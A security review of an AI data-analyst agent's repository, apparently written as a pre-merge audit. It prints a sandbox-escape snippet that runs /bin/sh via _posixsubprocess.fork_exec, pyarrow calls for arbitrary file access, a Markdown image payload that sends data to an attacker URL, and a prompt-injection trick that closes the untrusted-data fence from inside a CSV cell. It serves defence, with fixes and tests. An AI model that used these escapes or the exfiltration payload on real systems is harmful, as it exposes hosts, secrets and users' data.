# Repository review: `fix/review-findings`

A hostile review of the whole repository at `0890453` (main after the integration rounds).
It covers security, correctness, reliability and code quality. Findings are ranked by
severity. Every **High** and **Medium** finding is fixed on this branch, and each fix has a
regression test. Each test was run against the old code and fails there, except M2's: the old
rendering code sat inside the Streamlit script and could not be imported. M2's test instead
checks that each payload is a real image before it is sanitised. **Low** findings are documented with a one-line
reason and left as they are.

Severity scale:
- **High:** an attacker-controlled input (dataset contents, or model output steered by them)
  reaches the host, secrets or other users' data.
- **Medium:** a realistic input breaks a security control, corrupts a run, or takes down or
  wedges the service.
- **Low:** defence in depth, design limits already documented elsewhere, and code quality.

Method: I read every module under `src/`, plus `frontend/`, the Dockerfile, compose and the
deploy docs. Each security claim was then tested live against the sandbox, the DuckDB runner
and the API with small exploit scripts. "Confirmed" below means the exploit ran.

## Summary

| ID | Sev | Area | Finding | Status |
|---|---|---|---|---|
| H1 | High | Security: sandbox | `run_python` can spawn processes via `_posixsubprocess.fork_exec` (no import, no audit event) | Fixed `c212046` |
| H2 | High | Security: sandbox | `run_python` can read and write any file via pyarrow's native I/O (`input_stream`, `to_parquet`) | Fixed `c212046` |
| M1 | Medium | Security: prompt injection | The untrusted-data fence is case-sensitive: `</TOOL_OUTPUT>` in data closes it | Fixed `66ac36d` |
| M2 | Medium | Security: exfiltration | The UI renders untrusted Markdown, including images: zero-click exfiltration via image URLs | Fixed `4f755a0` |
| M3 | Medium | Reliability: DoS | The upload size limit is checked only after Starlette has spooled the whole body | Fixed `dfe61f2` |
| M4 | Medium | Correctness / DoS | `make_chart` uses pyplot global state across API threads, and `bins` is unbounded (OOM) | Fixed `0527a84` |
| M5 | Medium | Correctness: loop | Two `final_report` calls in one response leave a `tool_use` unanswered, so the run dies with a 400 | Fixed `6ae2b96` |
| M6 | Medium | Correctness: approval | `EXPLAIN ANALYZE` (or a leading comment) bypasses the approval row gate | Fixed `31504ed`, `d8f80fb` |
| M7 | Medium | Reliability: sandbox | `preexec_fn` is used from the multi-threaded API process (documented deadlock hazard) | Fixed `c212046` |
| M8 | Medium | Reliability: job store | SQLite or tracer failures leave jobs non-terminal forever, and their SSE streams never end | Fixed `801693c` |
| L1–L24 | Low | various | see below | Documented |

The open items from `docs/integration-notes.md` are also closed on this branch (`aa8afc9`):
`eval run --semantic-layer`, a package-relative metrics dir, and L3 tasks skipped (not failed)
when no judge is configured. See [Open items](#open-items-from-docsintegration-notesmd).

---

## High

### H1 — Sandbox escape: process execution through `_posixsubprocess.fork_exec`

`src/analyst_agent/sandbox/_child/sitecustomize.py`, `bootstrap.py`

The Python sandbox's process controls were all Python-level: the audit hook denied
`subprocess.*`, `os.system`, `os.exec*`, `os.fork` and similar events, and the import guard
blocked `import subprocess`. But every module pandas has already loaded is reachable by
attribute access, with no import at all:

```text
o = pd.io.common.os
m = o.sys.modules['_posixsubprocess']
m.fork_exec([b'/bin/sh', b'-c', b'id'], [b'/bin/sh'], True, (), None, None, -1, -1, -1, w, -1, w, er, ew, ...)
```

`_posixsubprocess.fork_exec` raises **no audit event**. Confirmed: it printed `uid=0(root)`
from `/bin/sh`. The shell runs with none of the Python guards: it has the host network and
can read anything the service user can. That includes `/proc/<api pid>/environ`, which holds
`ANTHROPIC_API_KEY`, the job database and other users' uploads. A dataset that steers the model
(prompt injection) is enough to reach this; no direct access to the API is needed.

**Fix.** A new module, `_child/_oslock.py`, installs a **seccomp-bpf** filter on every thread
(TSYNC) right before user code runs. These fail with `EPERM`: `execve`/`execveat`,
`fork`/`vfork`, `clone` without `CLONE_THREAD`, `clone3` (`ENOSYS`, so libc falls back to
`clone`), any `socket` that is not `AF_UNIX`, `ptrace`, `process_vm_*`,
`setrlimit`/`prlimit64`, `unshare`, `bpf`, `io_uring_setup`, and foreign-ABI syscalls
(i386/x32). The filter is required on Linux: if it cannot be installed, the bootstrap refuses
to run user code.

**Tests:** `tests/sandbox/test_python_security.py::test_fork_exec_via_module_attribute_is_blocked`
and `::test_seccomp_filter_program_is_well_formed`.

### H2 — Sandbox escape: file read/write through pyarrow's native I/O

`src/analyst_agent/sandbox/_child/sitecustomize.py`

The audit hook's file controls watch the `open` event. pyarrow, which pandas loads, does its
own C++ I/O and never raises that event. Confirmed:

- `pd.io.common.os.sys.modules['pyarrow'].input_stream('/etc/hostname').read()` returned the
  file.
- `pd.DataFrame(...).to_parquet('/any/path')` wrote outside the temp dir.

This gives arbitrary reads of other users' datasets, `data/jobs.sqlite3` and `/proc/*/environ`,
and arbitrary writes (for example, poisoning another job's artifacts or the shared matplotlib
cache).

**Fix.** `_oslock.py` also applies a **Landlock** ruleset before user code runs. The process can
read only under the existing read roots and write only in its temp dir. It can execute nothing.
On ABI 4+ it has no TCP bind/connect, and on ABI 6+ it cannot send signals outside the sandbox.
Landlock is best effort: kernels without it (< 5.13, some gVisor setups) print
`[sandbox] Landlock unavailable` to stderr and fall back to the audit hook. `docs/sandbox.md`
now says this explicitly. This container's kernel reports ABI 7.

**Tests:** `::test_native_file_read_outside_roots_is_blocked`,
`::test_native_file_write_outside_work_dir_is_blocked` and
`::test_native_io_inside_work_dir_still_works`.

---

## Medium

### M1 — The untrusted-data fence can be closed from inside the data

`src/analyst_agent/tools/registry.py::_neutralise`

Tool output is wrapped in `<tool_output … trust="untrusted">` and the system prompt says not
to follow instructions inside it. `_neutralise` escaped only the exact lowercase
`</tool_output` and `<tool_output`. A CSV cell containing `</TOOL_OUTPUT>`, `</Tool_Output>` or
`< /tool_output>` closes the fence as far as the model is concerned. The same wrapper guards
the router and the critic.

**Fix.** A case-insensitive, whitespace-tolerant regex.
**Test:** `tests/test_tools.py::test_wrap_untrusted_neutralises_case_and_spacing_variants`.

### M2 — Zero-click data exfiltration through Markdown images in the UI

`frontend/app.py`

The Streamlit UI passed several things to `st.markdown`, `st.error` or `st.success`:

- every trace line: `tool_result` summaries (the first 300 characters of raw query output, so
  dataset contents), plans, critic issues and approval summaries;
- the report;
- job errors;
- the dataset's column names (CSV headers).

A Markdown image is fetched by the viewer's browser as soon as it renders. So
`![x](https://attacker/?d=<values>)` in data, or in model output steered by data, leaks values
with no click. The report did strip `![..](..)` with a regex, but reference-style images
(`![x][1]` plus `[1]: url`) and nested parentheses got through, and nothing else was filtered.

**Fix.** A new module, `frontend/render.py`, holds the pure rendering helpers. Its `safe_md()`
makes every image inert. `describe()`, the report, errors, reasons and column names (now
`code_span()`) all go through it. **Test:** `tests/test_frontend_render.py` parses the output
with markdown-it and asserts there are no image tokens.

### M3 — Upload size limit enforced too late

`src/analyst_agent/api/datasets.py::DatasetStore.save`

FastAPI/Starlette parse multipart forms, and spool them to disk, **before** the endpoint runs.
The `max_upload_mb` check in `save()` therefore only runs once the whole body has been
received, so one request can fill the disk or memory.

**Fix.** An ASGI middleware, `UploadSizeLimit` in `api/app.py`. It rejects a declared
`Content-Length` over the limit up front, and otherwise aborts with 413 as soon as the streamed
body passes it. **Test:** `tests/api/test_app.py::test_upload_limit_stops_reading_a_streamed_body`
streams 10 MiB and asserts that fewer than 2 MiB are read.

### M4 — `make_chart`: pyplot races between jobs, and an unbounded `bins` OOMs the API

`src/analyst_agent/tools/handlers.py::make_chart`

Charts render **in the API process** on the job thread pool, through `plt.subplots()`,
`plt.setp()` and `plt.close()`. Pyplot's figure registry is global and not thread-safe, so
concurrent jobs can draw into or close each other's figures. Separately, `spec.bins` went
straight to `ax.hist`. With `bins=10**9` the test process was OOM-killed, and in production
that takes down every job on the server. Only the model sets `bins`, but the model can be
steered by data.

**Fix.** The object-oriented API (`Figure` and `FigureCanvasAgg`, no pyplot), `bins` limited
to 1..200, and at most 10,000 points per series. **Tests:**
`tests/test_tools.py::test_make_chart_rejects_unbounded_bins`,
`::test_make_chart_does_not_touch_pyplot_global_state` and
`::test_make_chart_concurrent_threads_write_their_own_charts`.

### M5 — A second `final_report` in one response kills the run

`src/analyst_agent/core/loop.py::AgentLoop._run`

When one assistant message contained two `final_report` calls, `submitted` was overwritten.
The first call's `tool_use` id then got no `tool_result`. The Messages API rejects the next
request with a 400 (unanswered `tool_use`), `_is_retryable` treats that as fatal, and the run
ends in `ERROR` with the report lost.

**Fix.** Only the first submission is reviewed. Each later one gets an error `tool_result`.
**Test:** `tests/test_loop.py::test_two_final_reports_in_one_response_each_get_a_tool_result`.

### M6 — Approval row gate bypassed with `EXPLAIN ANALYZE`

`src/analyst_agent/core/approval.py::ApprovalPolicy.sql_estimate`

A query starting with `EXPLAIN` was treated as already planned and never gated. But
`EXPLAIN ANALYZE` **executes** the query. A leading comment (`-- x\nSELECT …`) also turned the
estimate into `EXPLAIN -- x …`, which still works, while `-- x\nEXPLAIN ANALYZE …` failed to
parse and so failed open. Either way, a step the human was meant to approve ran unasked.

**Fix.** The policy strips leading comments (keeping parentheses), gates `EXPLAIN ANALYZE` on
the inner query's estimate, and leaves plain `EXPLAIN` ungated. **Tests:**
`tests/test_approval.py::test_sql_explain_analyze_is_gated_on_the_inner_query`,
`::test_sql_leading_comment_does_not_hide_the_query` and
`::test_sql_parenthesised_query_is_still_estimated`.

### M7 — `preexec_fn` in a multi-threaded server

`src/analyst_agent/sandbox/python_runner.py::_make_preexec`

`run_python` set rlimits in a `preexec_fn`. The Python docs warn that `preexec_fn` "is not safe
to use in the presence of threads" (the child can deadlock before `exec`). The API calls it
from a `ThreadPoolExecutor`, alongside SSE, SQLite and approval-broker threads.

**Fix.** The limits are passed in the child's config and applied by `sitecustomize` before
anything else runs. Hard equals soft, and seccomp blocks raising them. **Test:**
`::test_rlimits_applied_without_preexec_fn` checks `Popen` gets no `preexec_fn` and reads the
limits from `/proc/self/limits`.

### M8 — Jobs stranded in `running` (and SSE streams that never end)

`src/analyst_agent/api/jobs.py::JobManager._run`, `api/store.py::JobStore`

There were two paths:

- In `_run`, the status update and `tracer_factory(...)` ran **before** the `try`. An exception
  there vanished into the executor's future, leaving the job `queued` or `running`.
- Every store write mirrored to SQLite and let `sqlite3.Error` propagate. A full disk or a
  locked database mid-job raised from inside `emit` or `_fail`, so `_fail` itself could throw
  and never set the terminal status.

In both cases `_event_stream` polls the job forever.

**Fix.** The whole of `_run` is guarded. SQLite is a best-effort mirror (logged), as the
module's docstring already said: "in-memory primary". **Tests:**
`tests/api/test_app.py::test_tracer_failure_at_job_start_still_ends_the_job`,
`::test_sqlite_failure_mid_job_does_not_strand_it` and
`tests/api/test_store.py::test_sqlite_write_failure_does_not_break_the_in_memory_job`.

---

## Low (documented, not fixed)

| ID | Area | Finding | Why it is left |
|---|---|---|---|
| L1 | Security | The API has no authentication or authorisation: anyone who reaches it can read any job, report or artifact and approve any pending step. | Access control is the Cloud Run IAM boundary (`--no-allow-unauthenticated`, `deploy/cloudrun.md`); app-level auth is a feature, not a fix. |
| L2 | Security | Artifacts from all jobs share one directory, and `make_chart` names are `slug-sha1(spec)[:8]`, so they are guessable. | Only matters without the L1 boundary; sandbox exports already use random names. |
| L3 | Security | `/artifacts` serves `.svg` as `image/svg+xml` (script-capable if opened directly). | Nothing writes SVG: the sandbox and `make_chart` export PNG, JPG, CSV, JSON, TXT and MD only. |
| L4 | Security | `_register_artifact` copies any absolute path a runner returns into the public artifacts dir. | Paths come from trusted tool code (`make_chart`, the sandbox exporter), never from the model. |
| L5 | Security | Uploaded DuckDB files are opened by a connection with external access on (`_validate_duckdb`, `_copy_duckdb_tables`). | Only base tables are read with `SELECT *`. Probing found no file-reading scalar functions. Hardening (`enable_external_access=false` on those connections) is recommended. |
| L6 | Security | `wrap_untrusted(name, …)` puts the tool name into an attribute unescaped. | The name is the model's own `tool_use.name`, not data. |
| L7 | Security | DuckDB metadata functions (`duckdb_databases()`, `current_setting()`) reveal temp paths. | Paths only, with no data. External access is off and the configuration is locked. |
| L8 | Security | The CLI approval prompt prints model-written code raw, so terminal escape sequences pass through. | Local, interactive use only. |
| L9 | Correctness | The token budget can overshoot by one request (input plus `max_tokens`), because it is checked before each call. | Matches the documented "stop once reached" semantics; clamping `max_tokens` would truncate tool calls. |
| L10 | Correctness | Cache-read tokens count fully towards `AGENT_TOKEN_BUDGET`, so caching does not stretch the budget. | This is the documented definition ("input + output + cache tokens"). |
| L11 | Correctness | The critic fails open: unparseable output counts as `pass` (run status `completed_with_issues`). | By design, so a flaky critic cannot wedge the loop; the status records it. |
| L12 | Correctness | After a denial, the budget-fraction gate asks again on every tool call. | Conservative: only an approval stops the questions. |
| L13 | Correctness | The row gate fails open when `EXPLAIN` shows no cardinality (for example `Cross Product`). | Already known (integration notes); the 30 s SQL timeout still bounds the cost. |
| L14 | Correctness | The job store and approval broker are per-process: with several workers sharing a DB, `mark_interrupted` would fail other workers' running jobs. | The image runs one uvicorn worker, and deploy docs pin `--max-instances 1`. |
| L15 | Reliability | There is no job-level wall-clock timeout. LLM calls rely on the SDK's 600 s default times retries. | Bounded by `max_turns` plus the SQL and Python timeouts; worth adding later. |
| L16 | Reliability | Retries ignore `Retry-After`. | Exponential backoff with jitter up to 30 s already covers typical 429/529 windows. |
| L17 | Reliability | `ApprovalBroker.close()` racing with a new `request()` can block that worker until `timeout + 5` s. | Only during shutdown. |
| L18 | Reliability | `JobManager.submit` after `shutdown()` raises and leaves a `queued` record. | Only during shutdown; the next start marks it interrupted. |
| L19 | Reliability | `eval/cli.py` builds `Settings()` at import, so a malformed `AGENT_*` variable breaks even `--help`. | Fails loudly and early, which is acceptable for a dev tool. |
| L20 | Performance | `run_python` reloads and re-pickles the full dataset on every call. | Correct, and cheap at benchmark sizes. |
| L21 | Code quality | Duplicated logic: `tools.table_name_for` vs `sandbox._loaders.safe_identifier` (same rule, two copies); four copies of identifier quoting (`handlers`, `router`, `_loaders`, inline in `datasets`); two Markdown table renderers (`tools/formatting.rows_to_markdown`, `duckdb_runner.to_markdown`); three "extract JSON from model text" parsers (`critic.parse_verdict`, `router.parse_route`, `judge.parse_json_object`); the schema query in both `inspect_schema` and `router.schema_summary`; `ModelUsage` and `CostTracker` duplicate fields; `_ms_since` twice. | Behaviour is identical today; consolidating means a refactor across package boundaries that parallel branches own. |
| L22 | Code quality | Dead code: `sandbox.current_tables` alias, `Sandbox.datasets`, `_read_roots(work_dir)`'s unused parameter, `DuckDBRunner.run_sql`'s `timeout_s`/`row_limit` overrides (no caller), `EventType.progress` (never emitted by the core), the `semantic_layer_rules`/`router` prompt versions reported when off (see integration notes). | Harmless; removing public names needs a deprecation pass. |
| L23 | Code quality | Missing type hints: `ruff --select ANN` reports 74, mostly `Any` (ANN401) and untyped closures in `sandbox/_child/*`, `api/agent.py`, `api/observability.py` and `eval/agent.py`. ANN is not in the ruff config. | Not enforced today; enabling ANN is a repo-wide change. |
| L24 | Code quality | Unbounded message history: tool outputs are capped, but there is no compaction. | Bounded by `max_turns` (15) and the tool-output cap. |

---

## Open items from `docs/integration-notes.md`

All three are closed in `aa8afc9`:

1. **`--semantic-layer` on `eval run`.** `eval run --semantic-layer/--no-semantic-layer` is
   passed through `load_agent` → `CoreAgent` → `_run_core` the same way as `--routing`, and is
   recorded as `meta.json` `config.semantic_layer_enabled`. **Tests:**
   `tests/eval/test_open_items.py::test_load_agent_semantic_layer_override_wins_over_env` and
   `::test_eval_cli_accepts_semantic_layer_and_records_it`.
2. **Metrics dir relative to the installed package.** `AGENT_SEMANTIC_METRICS_DIR` now defaults
   to unset, which means `default_metrics_dir()`. A built wheel carries `benchmarks/metrics` as
   `analyst_agent/semantic/metrics` (hatch `force-include`; checked with `uv build`). A source
   checkout reads `<repo>/benchmarks/metrics`. The Dockerfile copies the metrics into the
   builder stage so the wheel build finds them. **Tests:**
   `::test_default_metrics_dir_does_not_depend_on_cwd` and
   `::test_default_metrics_dir_prefers_the_copy_bundled_in_the_wheel`.
3. **L3 skipped, not failed, without a judge.** With no `ANTHROPIC_API_KEY` or
   `ANTHROPIC_AUTH_TOKEN`, `eval run` warns and runs judge-less. `LLMJudge` raises
   `JudgeUnavailable`, which `score_rubric` records as skipped (excluded from accuracy) and
   `score_adversarial` records as "judge skipped". **Tests:**
   `::test_llm_judge_without_credentials_skips_l3_and_adv_judge` and
   `::test_eval_cli_without_api_key_skips_l3`.

## Not verified here

- **Docker build.** The Dockerfile change (copying `benchmarks/metrics` into the builder) was
  not built: `ghcr.io` is blocked in this environment, as noted in the integration notes.
  `uv build --wheel` locally produces the expected wheel.
- **Landlock and seccomp on Cloud Run.** Gen2 (a microVM with a full Linux kernel) supports
  both. Gen1 (gVisor) supports seccomp, but its Landlock support should be checked: look for
  `[sandbox] Landlock unavailable` in job stderr.
